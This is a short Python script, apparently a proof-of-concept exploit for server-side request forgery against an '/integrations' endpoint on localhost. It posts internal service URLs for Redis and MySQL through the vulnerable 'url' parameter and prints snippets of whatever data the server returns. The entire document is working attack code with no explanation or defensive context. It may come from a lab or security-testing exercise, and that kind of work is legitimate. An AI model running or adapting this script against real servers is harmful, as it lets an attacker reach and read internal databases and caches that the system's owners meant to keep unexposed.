import requests

TARGET = "http://localhost:8080/integrations"

def exploit_ssrf():
    print("[*] Exploiting SSRF on /integrations...")
    
    internal_targets = [
        "http://localhost:6379",
        "http://localhost:3306"
    ]
    
    for url in internal_targets:
        print(f"[*] Probing internal service: {url}")
        response = requests.post(TARGET, data={"url": url})
        
        if response.status_code == 200:
            print(f"[+] Response for {url} received!")
            if "<pre>" in response.text:
                try:
                    snippet = response.text.split("<pre>")[1].split("</pre>")[0][:100]
                    print(f"    - Data Snippet: {snippet.strip()}...")
                except IndexError:
                    print("    - Data Snippet: [Empty or malformed output]")
        else:
            print(f"[-] Service {url} unreachable or SSRF filtered.")

if __name__ == "__main__":
    exploit_ssrf()
